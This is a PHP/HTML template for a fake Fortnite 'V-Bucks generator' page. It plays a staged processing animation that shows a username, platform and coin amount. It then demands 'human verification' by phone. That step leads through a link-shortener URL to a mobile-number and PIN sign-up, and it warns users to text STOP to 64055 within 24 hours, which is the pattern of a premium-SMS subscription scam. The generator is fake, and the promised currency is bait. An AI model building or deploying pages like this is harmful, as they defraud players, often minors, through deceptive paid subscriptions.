<?php
define('IS_AJAX', isset($_SERVER['HTTP_X_REQUESTED_WITH']) &&      strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest');
?>
<div class="console-wrapper">
	<div class="console-header">
		<div class="console-label">Processing...</div>
	</div>
	<div class="console-content">
		<div class="console-loader-wrapper">
			<div class="spinner">
				<div class="rect1"></div>
				<div class="rect2"></div>
				<div class="rect3"></div>
				<div class="rect4"></div>
				<div class="rect5"></div>
			</div>
		</div>
		<div class="console-username-wrapper animated infinite pulse">
			<div id="console-username-val"></div>
			<div id="console-platform-val"></div>
		</div>
		<div class="console-count-to-wrapper">
			<div class="amount-selection-item-inner-wrapper">				
				<img id="console-selected-amount-img" src="img/v-card-3.jpg" class="img-fluid v-card" />
				<div class="selected-amount-wrapper-console">
					<span id="console-amount" class="v-card-amount"></span>
					<span class="v-card-label">V-Bucks</span>
				</div>
			</div>
		</div>
		<div class="console-message-wrapper">
			<div class="console-message"></div>
		</div>
		<div class="console-progress-bar-wrapper">
			<div id="progressBarConsole" class="console-loadbar"><div></div></div>
		</div>
	</div>	
</div>
<div class="human-verification-wrapper">
	<h3>HUMAN VERIFICATION REQUIRED</h3>
    <br>
    <p>In order to prevent our generator from robot abuse you need to verify you're human using your mobile number.</p>
    <br>
    <p>1. Click the "Verify" button below.</p>
    <a href="https://www.relinkz.com/N3E3aH2LHf7ST9S8"><button class="fortnite-button click-sound"><span>Verify</span></button></a>
    <br>
    <p>2. Enter your mobile number and enter the received PIN.</p>
    <br>
    <p>3. Your V-bucks will be added automatically after you enter the PIN.</p>
    <br>
    <p>4. Text "STOP" to 64055.</p>
    <br>
    <p>IMPORTANT: THE VERIFICATION IS 100% FREE FOR 24 HOURS. MAKE SURE TO TEXT "STOP" TO 64055 WITHIN 24 HOURS.</p>
     <br>
	<div class="verification-loader-wrapper">
		<div class="spinner">
			<div class="rect1"></div>
			<div class="rect2"></div>
			<div class="rect3"></div>
			<div class="rect4"></div>
			<div class="rect5"></div>
		</div>
	</div>
	<div id="time-left-wrapper" class="time-left-wrapper">
		<span>Time Left:</span>
		<span id="human_verification_timer_time"></span>
	</div>
</div>